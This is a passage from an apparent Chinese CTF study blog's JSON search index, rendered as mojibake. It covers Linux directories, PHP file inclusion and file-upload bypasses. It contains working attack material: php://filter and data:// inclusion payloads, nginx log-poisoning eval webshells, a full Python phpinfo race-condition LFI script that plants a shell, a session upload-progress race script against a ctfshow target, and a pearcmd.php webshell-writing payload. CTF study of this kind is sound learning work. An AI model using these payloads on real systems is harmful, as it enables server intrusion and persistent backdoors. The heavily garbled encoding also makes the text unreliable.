ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarç­‰ã€‚\n/usr/binç›®å½•:\nä¸»è¦æ”¾ç½®ä¸€äº›åº”ç”¨è½¯ä»¶å·¥å…·çš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚c++ã€g++ã€gccã€chdrvã€diffã€digã€duã€ejectã€elmã€freeã€gnomeã€ zipã€htpasswdã€kfmã€ktopã€lastã€lessã€localeã€m4ã€makeã€manã€mcopyã€ncftpã€ newaliasesã€nslookup passwdã€quotaã€smbã€wgetç­‰ã€‚\n/sbinç›®å½•: \nä¸»è¦æ”¾ç½®ä¸€äº›ç³»ç»Ÿç®¡ç†çš„å¿…å¤‡ç¨‹åºä¾‹å¦‚:cfdiskã€dhcpcdã€dumpã€e2fsckã€fdiskã€haltã€ifconfigã€ifupã€ ifdownã€initã€insmodã€liloã€lsmodã€mke2fsã€modprobeã€quotacheckã€rebootã€rmmodã€ runlevelã€shutdownç­‰ã€‚\n/usr/sbinç›®å½•: \næ”¾ç½®ä¸€äº›ç½‘è·¯ç®¡ç†çš„å¿…å¤‡ç¨‹åºä¾‹å¦‚:dhcpdã€httpdã€imapã€in.*dã€inetdã€lpdã€namedã€netconfigã€nmbdã€sambaã€sendmailã€squidã€swapã€tcpdã€tcpdumpç­‰\nç»¼è¿°ï¼š\nå¦‚æœè¿™æ˜¯ç”¨æˆ·å’Œç®¡ç†å‘˜å¿…å¤‡çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°±ä¼šæ”¾åœ¨/binã€‚å¦‚æœè¿™æ˜¯ç³»ç»Ÿç®¡ç†å‘˜å¿…å¤‡ï¼Œä½†æ˜¯ä¸€èˆ¬ç”¨æˆ·æ ¹æœ¬ä¸ä¼šç”¨åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°±ä¼šæ”¾åœ¨ /sbinã€‚\nç›¸å¯¹è€Œè¨€ã€‚å¦‚æœä¸æ˜¯ç”¨æˆ·å¿…å¤‡çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¤šåŠä¼šæ”¾åœ¨/usr/binï¼›å¦‚æœä¸æ˜¯ç³»ç»Ÿç®¡ç†å‘˜å¿…å¤‡çš„å·¥å…·ï¼Œå¤šåŠä¼šæ”¾åœ¨/usr/sbin\n\n\nå•çº¯ä½¿ç”¨lså‘½ä»¤ï¼Œæ˜¾ç¤ºçš„å†…å®¹æœ‰é™ã€‚åœ¨å®é™…ä½¿ç”¨çš„æ—¶å€™ï¼Œç»å¸¸éœ€è¦æ­é…ä¸€äº›é€‰é¡¹æ¥æ˜¾ç¤ºæ›´åŠ ä¸°å¯Œçš„å†…å®¹ï¼Œlså¸¸ç”¨çš„é™„åŠ é€‰é¡¹å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š\n-a    æ˜¾ç¤ºæŒ‡å®šè·¯å¾„ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶-l    æ˜¾ç¤ºæ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–‡ä»¶ç±»å‹ï¼Œæƒé™ï¼Œæ‰€å±ç”¨æˆ·ï¼Œæ‰€å±ç”¨æˆ·ç»„ï¼Œæ–‡ä»¶å¤§å°ï¼Œä¸Šä¸€æ¬¡ä¿®æ”¹æ—¶é—´ç­‰-h    æ–‡ä»¶å¤§å°ä»¥KBytesä¸ºå•ä½æ˜¾ç¤º-S    æŒ‰ç…§æ–‡ä»¶å¤§å°é¡ºåºæ˜¾ç¤ºï¼Œé»˜è®¤ä»å¤§åˆ°å°ï¼›è‹¥è¦ä»å°åˆ°å¤§ï¼Œå¯ä½¿ç”¨-Sr\n\næˆ‘ä»¬ ls -al /usr/binå‘ç°ï¼ˆè¿™é‡Œæ˜¯fuzzçš„ï¼Œå…¶ä»–é¢˜ä¹Ÿè¡Œéœ€è¦ls -al å…¶ä»–æ–‡ä»¶å¤¹ï¼Œç”šè‡³å¯ä»¥ls -al /*/*ï¼‰\n\nè¿™é‡Œçš„-rwsr-sr-x\n\nç¬¬ä¸€ä¸ªsä»£è¡¨çš„æ˜¯suidï¼šä»–è¡¨ç¤ºå½“å…¶ä»–çš„ç”¨æˆ·æ‰§è¡Œæ­¤å‘½ä»¤æ—¶ï¼Œå¯ä»¥å–å¾—å’Œæ­¤æ–‡ä»¶çš„æ‰€æœ‰è€…ä¸€æ ·çš„æƒé™æ¥å–å¾—ç³»ç»Ÿèµ„æºç¬¬è€Œä¸ªsä»£è¡¨çš„æ˜¯sgidï¼šä»–è¡¨ç¤ºå½“å…¶ä»–çš„ç”¨æˆ·æ‰§è¡Œæ­¤å‘½ä»¤æ—¶ï¼Œå¯ä»¥å–å¾—å’Œæ­¤æ–‡ä»¶çš„å±ç»„ä¸€æ ·çš„æƒé™æ¥å–å¾—ç³»ç»Ÿèµ„æº\n\næ€»ä¹‹ï¼Œtac å¯ç”¨\n\n4.èšå‰‘æ“ä½œæ•°æ®åº“æœ‰æ—¶å€™æˆ‘ä»¬èšå‰‘è¿ä¸ŠæœåŠ¡å™¨ä¹‹å, ä¼šå‘ç°æœåŠ¡å™¨ç›®å½•é‡Œæ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„æ•°æ®, ä½†æ˜¯ç½‘ç«™å´æœ‰æ•°æ®åº“è¿æ¥, è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å°è¯•ç”¨èšå‰‘æ“ä½œæ•°æ®åº“\nç„¶åæˆ‘ä»¬ç‚¹å‡»æ·»åŠ , é€‰æ‹©å¥½æ•°æ®åº“ç±»å‹, ä»¥åŠå¯†ç å°±å¯ä»¥è¿æ¥\n\nè¿æ¥å, æˆ‘ä»¬æ ¹æ®æç¤º, æ‰§è¡ŒSQLè¯­å¥å°±å¯ä»¥æ‹¿åˆ°flag\n","tags":["Web","Study","PHP"]},{"title":"Web_3_PHPæ–‡ä»¶åŒ…å«","url":"/2022/09/10/web_3/","content":"ç¬¬ä¸€èŠ‚ phpæ–‡ä»¶åŒ…å«0x1æ–‡ä»¶åŒ…å«çš„æœ¬è´¨æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨å‡½æ•°ä½œä¸ºæ¥å£è°ƒç”¨ã€‚\n0x2æ–‡ä»¶åŒ…å«å¸¸è§å‡½æ•°includeã€requireã€include_onceã€require_once\n\ninclude ä»…ä»…æ˜¯åŒ…å«ï¼ŒåŒ…å«ä¸åˆ°ä¸å½±å“åç»­æ‰§è¡Œ\nrequire å¿…é¡»åŒ…å«æˆåŠŸã€åŒ…å«ä¸åˆ°å°±æŠ¥é”™ä¸å†æ‰§è¡Œ\ninclude_once åŒ…å«ä¸€æ¬¡ï¼Œå†æ¬¡åŒ…å«åŒæ ·æ–‡ä»¶ä¸å†é‡å¤åŒ…å«\nrequire_once åŒä¸ŠåŒ…å«ä¸€æ¬¡\n\n0x3ä¼ªåè®®è®¡ç®—æœºä¸­çš„åè®®\nphpä¸­çš„ä¼ªåè®®fileåè®®Linux phpä¸­å¯ä»¥è‡ªå·±è®¡ç®—ç›®å½•ï¼Œå¯ä»¥å­˜åœ¨è™šæ‹Ÿç›®å½•ï¼Œå¯ä»¥../å¾ˆå¤š\nHTTPåè®®ftpåè®®phpåè®®php://inputç›´æ¥postå‘åŒ…å³å¯\nphp://filteræ˜¯ä¸€ç§åŸå°è£…å™¨\nå‚æ•°\n\n\n\nåç§°\næè¿°\n\n\n\nresource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;\nè¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚\n\n\nread=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;\nè¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚\n\n\nwrite=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;\nè¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚\n\n\n&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;\nä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€         çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚\n\n\nç®€è¨€ä¹‹ï¼Œresourceæ˜¯æ•°æ®æ¥æºï¼Œwriteå†™å…¥ï¼Œreadè¯»å–\nbase64ç»•è¿‡\n?file=php://filter/write=convert.base64-decode/resource=1.php\nè¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦postå‘åŒ…å†™å…¥çš„å†…å®¹ï¼Œè€Œä¸”è¦base64ç¼–ç å\nrot13ç»•è¿‡\n?file=php://filter/write=string.rot13/resource=1.php\nè¿™é‡ŒåŒæ ·éœ€è¦postå‘åŒ…å†™å…¥çš„å†…å®¹ï¼Œè€Œä¸”è¦rot13ç¼–ç åï¼Œè¿™é‡Œè¿˜æ˜¯æ¨èCyberChef\ndataåè®®å¯ä»¥ç›´æ¥æ‰§è¡Œé‡Œè¾¹ä»£ç å†…å®¹\ndata://æˆ‘ä»¬å¯ä»¥åœ¨å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°å®ƒçš„è¯­æ³•\nhttp://www.faqs.org/rfcs/rfc2397.html\n?file=data:,&lt;?php phpinfo(); ?&gt;\nç¬¬äºŒèŠ‚ æ–‡ä»¶åŒ…å«é«˜çº§åˆ©ç”¨æ–‡ä»¶åŒ…å«å¯æ§ç‚¹\næ–‡ä»¶åå¯æ§\nåç¼€å¯æ§\n\næ–‡ä»¶åå¯æ§æ„å‘³ç€å¯ä»¥æ§åˆ¶åè®®å¤´\nè¿™æ—¶å€™ä¼˜å…ˆä½¿ç”¨dataåè®®\nåç¼€å¯æ§å¯ä»¥è€ƒè™‘è·¯å¾„è·³è½¬ï¼Œå‚è€ƒfileåè®®\nç›´æ¥ç–¯ç‹‚../../../../ä¹‹å‰æ˜¯æåˆ°è¿‡Linuxå¯¹äº../èƒ½è‡ªå·±è®¡ç®—\nnginxæ—¥å¿—åŒ…å«nginx çš„é»˜è®¤è·¯å¾„ /var/log/nginx/access.log\nè¿™é‡Œæˆ‘ä»¬è¦ä½¿ç”¨user-agentï¼Œå°†æ¶æ„ä»£ç å†™åˆ°é‡Œè¾¹ï¼Œå¦‚æœæ˜¯å…¶ä»–æ–¹å¼åŒ…å«ï¼Œä»£ç å°†ä¼šè¢«ç¼–ç å¯¼è‡´æ— æ³•æ‰§è¡Œ\n\nç„¶åå†è¯»å–/var/log/nginx/access.logæ‰§è¡Œæ—¥å¿—é‡Œçš„æ¶æ„ä»£ç \nå¸¸è§å‡ºé”™åœ°æ–¹\n\nåŒ…å«çš„æ–‡ä»¶è·¯å¾„é”™è¯¯/var/log/nginx/access.log\nå†™å…¥çš„UAè¯­æ³•é”™è¯¯&lt;?php eval($_POST[1]); ?&gt;\nè½¬ä¹‰é”™è¯¯file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval($_POST[1]);?&gt;&quot;);\n\nå½“phpè¯­æ³•ä¸­åœ¨åŒå¼•å·ä¸­çš„ç¬¦å·éœ€è¦è½¬ä¹‰ï¼Œå¦åˆ™åˆ¤æ–­ä¸ºç©º\nå³\n&quot;&lt;?php eval($_POST[1]);?&gt;&quot; = &lt;?php eval();?&gt;\n\nè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥æŠŠ$ç¬¦å·è¿›è¡Œ\\è½¬ä¹‰\n&lt;?php eval(\\$_POST[1]);?&gt;\n\nç¬¦å·æ²¡æœ‰è¿›è¡Œè½¬ä¹‰ï¼Œæ— æ³•æ­£å¸¸æ‰§è¡Œ\nå¦‚æœå‘ç”Ÿè¯­æ³•é”™è¯¯ï¼Œæ±¡æŸ“äº†é¢˜ç›®ç¯å¢ƒï¼Œåªèƒ½é‡å¼€å®¹å™¨\nä¸´æ—¶æ–‡ä»¶åŒ…å«phpinfo(); ç«äº‰ä¸Šä¼ ï¼Œè¿™é‡Œæœ‰ä¸ªpython2çš„è„šæœ¬\n#!/usr/bin/python import sysimport threadingimport socketdef setup(host, port):    TAG=&quot;Security Test&quot;    PAYLOAD=&quot;&quot;&quot;%s\\r&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\\r&quot;&quot;&quot; % TAG    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\rContent-Type: text/plain\\r\\r%s-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot; % PAYLOAD    padding=&quot;A&quot; * 5000    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)    #modify this to suit the LFI script       LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\\rUser-Agent: Mozilla/4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r&quot;&quot;&quot;    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = &quot;&quot;    while len(d) &lt; offset:        d += s.recv(offset)    try:        i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)        fn = d[i+17:i+31]    except ValueError:        return None    s2.send(lfireq % (fn, host))    d = s2.recv(4096)    s.close()    s2.close()    if d.find(tag) != -1:        return fncounter=0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter &gt;= self.maxattempts:                    return                counter+=1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                                if x:                    print &quot;\\nGot it! Shell created in /tmp/g&quot;                    self.event.set()                                except socket.error:                return    def getOffset(host, port, phpinforeq):    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)        d = &quot;&quot;    while True:        i = s.recv(4096)        d+=i                if i == &quot;&quot;:            break        # detect the final chunk        if i.endswith(&quot;0\\r\\n\\r\\n&quot;):            break    s.close()    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)    if i == -1:        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)        print &quot;found %s at %i&quot; % (d[i:i+10],i)    # padded up a bit    return i+256def main():        print &quot;LFI With PHPInfo()&quot;    print &quot;-=&quot; * 30    if len(sys.argv) &lt; 2:        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)        sys.exit(1)    port=80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)        sys.exit(1)        poolsz=10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)        sys.exit(1)    print &quot;Getting initial offset...&quot;,      reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print &quot;Spawning worker pool (%d)...&quot; % poolsz    sys.stdout.flush()    tp = []    for i in range(0,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write( &quot;\\r% 4d / % 4d&quot; % (counter, maxattempts))                sys.stdout.flush()                if counter &gt;= maxattempts:                    break        print        if e.is_set():            print &quot;Woot!  \\m/&quot;        else:            print &quot;:(&quot;    except KeyboardInterrupt:        print &quot;\\nTelling threads to shutdown...&quot;        e.set()        print &quot;Shuttin&#x27; down...&quot;    for t in tp:        t.join()if __name__==&quot;__main__&quot;:    main()\n\nsessionæ–‡ä»¶åŒ…å«ï¼ˆupload_progressæ–‡ä»¶ä¸Šä¼ ï¼‰æœ‰åŒ…å«ç‚¹ï¼Œä¸”PHP_SESSION_UPLOAD_PROGRESSä¸å˜æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ­¤è„šæœ¬\nsession_upload_progressæœ€åˆæ˜¯phpä¸ºä¸Šä¼ è¿›åº¦æ¡è®¾è®¡çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼ŒPHPå°†è¿›è¡Œæµå¼ä¸Šä¼ ï¼Œå¹¶å°†è¿›åº¦ä¿¡æ¯æ”¾åœ¨sessionä¸­ï¼Œæ­¤æ—¶å³ä½¿ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–sessionï¼Œphpä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–sessionã€‚è€Œä¸”ï¼Œé»˜è®¤æƒ…å†µä¸‹session.uoload_progress.enabledæ˜¯ä¸ºonçš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç‰¹æ€§é»˜è®¤å¼€å¯ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªç‰¹æ€§æ¥åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆå§‹åŒ–sessionã€‚\nä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œsessionä¸­ä¸€éƒ¨åˆ†æ•°æ®ï¼ˆsession.uoload_progress.enabledï¼‰æ˜¯ç”¨æˆ·è‡ªå·±æ§åˆ¶çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼ŒåŒæ—¶postä¸€ä¸ªæ¶æ„å­—æ®µPHP_SESSION_UPLOAD_PROGRESSï¼Œç›®æ ‡æœåŠ¡å™¨çš„PHPå°±ä¼šè‡ªåŠ¨å¯ç”¨sessionï¼Œsessionæ–‡ä»¶å°†ä¼šè‡ªåŠ¨åˆ›å»ºã€‚\nimport requestsimport threadingsession=requests.session()sess=&#x27;ctfshow&#x27;url=&quot;http://6eb9a422-f96b-4a44-a67d-0d9f9d3e716f.challenges.ctfer.com:8080/&quot; #é¶åœºåœ°å€data1=&#123;        &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php echo &quot;success&quot;;file_put_contents(&quot;/var/www/html/1.php&quot;,&quot;&lt;?php eval(\\\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;&#125;file=&#123;        &#x27;file&#x27;:&#x27;ctfshow&#x27;&#125;cookies=&#123;        &#x27;PHPSESSID&#x27;: sess&#125;def write():        while True:                r = session.post(url,data=data1,files=file,cookies=cookies)def read():        while True:                r = session.get(url+&quot;?file=../../../../../../../tmp/sess_ctfshow&quot;)                if &#x27;success&#x27; in r.text:                        print(&quot;shell åœ°å€ä¸ºï¼š&quot;+url+&quot;1.php&quot;)                        exit()                        threads = [threading.Thread(target=write),       threading.Thread(target=read)]for t in threads:        t.start()\n\npearæ–‡ä»¶åŒ…å«pearæ¨¡å—ä¸‹æœ‰å¾ˆå¤šphpæ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨å…¶ä¸­çš„æŸä¸ªphpï¼Œåˆ†æå‘ç°/usr/local/lib/php/PEAR/Command/Install.phpå­˜åœ¨å¯åˆ©ç”¨ç‚¹\n/usr/local/lib/php/pearcmd.phpå­˜åœ¨å¯åˆ©ç”¨ç‚¹\n\nargvæ³¨å†ŒåŠŸèƒ½å¼€å¯äº†å°±å¯ä»¥ä½¿ç”¨è¿™ç§å§¿åŠ¿\nå¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶å†™å…¥ä¸€å¥è¯æœ¨é©¬\n?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+1.php\n\nå…¶ä¸­aaaå¯ä»¥å°†æ•°æ®å¼¹å‡ºargvï¼Œä¸‰ä¸ªâ•ï¼Œå››ä¸ªå…ƒç´ \nè¿œç¨‹æ–‡ä»¶åŒ…å«è¿™é‡Œæ˜¯ç»“åˆäº†ä¸Šè¾¹çš„æ—¥å¿—åŒ…å«ï¼Œæˆ–è€…å¯ä»¥ç†è§£æˆè¿œç¨‹æ—¥å¿—åŒ…å«\nè¿™é‡Œç”±äºé¢˜ç›®è¿‡æ»¤äº†ç¬¦å·. æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨http://www.ab173.com/net/ip2int.php å°†IPè½¬æ¢æˆçº¯æ•°å­—\n\n","tags":["Study","Wen","PHP_include"]},{"title":"Web_4_PHPæ–‡ä»¶ä¸Šä¼ ","url":"/2022/09/20/web_4/","content":"ç¬¬ä¸€èŠ‚ phpæ–‡ä»¶ä¸Šä¼ 0x1 phpæ–‡ä»¶ä¸Šä¼ æœºåˆ¶phpä½¿ç”¨ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨çš„æ–¹å¼æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œé€šè¿‡$_FILESæ•°ç»„åŒ…å«æ–‡ä»¶ä¿¡æ¯ï¼Œåœ¨PHPè„šæœ¬å¤„ç†è¿‡ç¨‹ä¸­ï¼Œå¯¹å·²ç»å­˜åœ¨åœ¨ä¸´æ—¶ç›®å½•çš„/tmp/php??????æ–‡ä»¶ä½¿ç”¨move_uploaded_fileå‡½æ•°æ¥ç§»åŠ¨åˆ°æ–°çš„ä½ç½®ã€‚\næ–‡ä»¶ä¸Šä¼ ä¿¡æ¯åŒ…å«çš„æ•°ç»„$_FILESæ•°ç»„ä¸­ï¼Œæ˜¯æ”¯æŒå¤šæ–‡ä»¶åŒæ—¶ä¸Šä¼ çš„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸Šä¼ çš„åå­—ä¸ºfile,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨$_FILES[&#39;file&#39;]è¿™ä¸ªæ•°ç»„ä¸­è·å¾—ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ä»¥ä¸‹ä¿¡æ¯\n\n$_FILES[&#39;file&#39;][&#39;name&#39;]è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶å\n$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]ä¸Šä¼ çš„æ–‡ä»¶åœ¨ä¸´æ—¶ç›®å½•ä¸­çš„æ–‡ä»¶å\n$_FILES[&#39;file&#39;][&#39;size&#39;]ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚\n$_FILES[&#39;file&#39;][&#39;type&#39;]ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹\n\n0x2 æ–‡ä»¶ä¸Šä¼ çš„ä¾‹å­æ–‡ä»¶ä¸Šä¼ è¡¨å•è¡¨å•æ˜¯ä¸€ç§HTMLä»£ç ï¼Œè¡¨ç¤ºå‘æŸä¸ªåœ°å€å‘é€ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®ï¼Œæ•°æ®æ ¼å¼å¯ä»¥åˆ†ä¸ºå‡ ç§\ngetè¡¨å•æ•°æ®é™„åŠ åœ¨urlå\npostè¡¨å•å°†æ•°æ®é™„åŠ åˆ°httpåŒ…ä¸­ï¼Œå‘é€çš„æ•°æ®æ˜¯ç»è¿‡urlç¼–ç è¿‡çš„\nrawè¡¨å•å°†æ•°æ®ç›´æ¥é™„åŠ åˆ°httpè¯·æ±‚åŒ…ä¸­ï¼Œä¸å­˜åœ¨é”®å€¼å¯¹ï¼Œç›´æ¥æ˜¯æ•°æ®ï¼Œå¸¸è§çš„æ–¹å¼æ˜¯file_get_contents(&quot;php://input&quot;)è¿™ç§è¯·æ±‚æ˜¯å’Œpostè¡¨å•äº’æ–¥çš„\njsonè¡¨å•ç±»å‹ä¸ºapplication/jsonï¼Œå¸¸è§äºapiæ¥å£\næ–‡ä»¶ä¸Šä¼ çš„ä¾‹å­&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt;  &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;      &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;      &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;    &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;\n\n&lt;?php$tmp_file =  $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];$dist_file = &quot;./upload/&quot;. $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];if(move_uploaded_file($tmp_file,$dist_file))&#123;  echo &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ&quot;;&#125;else&#123;  echo &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥&quot;;&#125;?&gt;\n\n\n\næ–‡ä»¶ä¸Šä¼ çš„æˆå› ç”±äºå†å²åŸå› ï¼Œæ—©æœŸæœåŠ¡å™¨æ¯”è¾ƒè´µï¼Œç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åªèƒ½å­˜æ”¾åœ¨webç›®å½•\n0x3 æ–‡ä»¶ä¸Šä¼ å¯èƒ½å­˜åœ¨çš„æ¼æ´æ–‡ä»¶ä¸Šä¼ æœ¬è´¨å°±æ˜¯å¯¹æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿå†™æ“ä½œï¼Œå°±æœ‰å¯èƒ½æ‰§è¡Œæˆ‘ä»¬å†™å…¥çš„æ¶æ„ä»£ç \næ–‡ä»¶ä¸Šä¼ åç¼€é»‘åå•è¿‡æ»¤æŸäº›é…ç½®æ–‡ä»¶ä¸ºäº†å…¼å®¹è€ç‰ˆæœ¬çš„phpä»£ç ï¼Œä¹Ÿä¼šè§£æphp3ï¼Œphp5ï¼Œphtml\nphpæ–‡ä»¶ä¸Šä¼ çš„00æˆªæ–­123.php%00.jpgä¿å­˜æ—¶.jpgä¼šè¢«æˆªæ–­èˆå¼ƒï¼Œä½†æ˜¯åªæœ‰PHPç‰ˆæœ¬å°äº5.3.4æ‰å­˜åœ¨æ­¤æ¼æ´\niconvå­—ç¬¦è½¬æ¢å¼‚å¸¸é€ æˆæˆªæ–­5.4ä»¥ä¸Šç‰ˆæœ¬å·²ç»ä¿®å¤\næ–‡ä»¶åç¼€ç™½åå•è¿‡æ»¤webæœåŠ¡å™¨è§£ææ¼æ´IISè§£ææ¼æ´Windowsç³»ç»Ÿä¸‹ä¸€èˆ¬ä½¿ç”¨ISSä½œä¸ºwebæœåŠ¡å™¨ï¼Œæ¯”è¾ƒè€ç‰ˆæœ¬ä¼šè§£æç›®å½•åå­—ä¸ºxxx.aspç­‰å­—ç¬¦æ„æˆçš„ç›®å½•ã€‚\nnginxè§£ææ¼æ´nginxé…ç½®é”™è¯¯\nnginxä¼šå°†åç¼€ä¸º123.txt/123.phpçš„uriè¯·æ±‚åŒ¹é…åˆ°ï¼Œè¯¯è®¤ä¸ºæ˜¯phpåç¼€\nApacheè§£ææ¼æ´å¦‚æœä¸Šä¼ 1.phpè¢«ç¦æ­¢ï¼Œå¯ä»¥ä¸Šä¼ 1.php.charmersix ï¼Œcharmersixåç¼€ä¸è¯†åˆ«ï¼Œå°±ä¼šç»§ç»­å¾€å‰è¯†åˆ«åç¼€ã€‚\n0x4æ–‡ä»¶ä¸Šä¼ 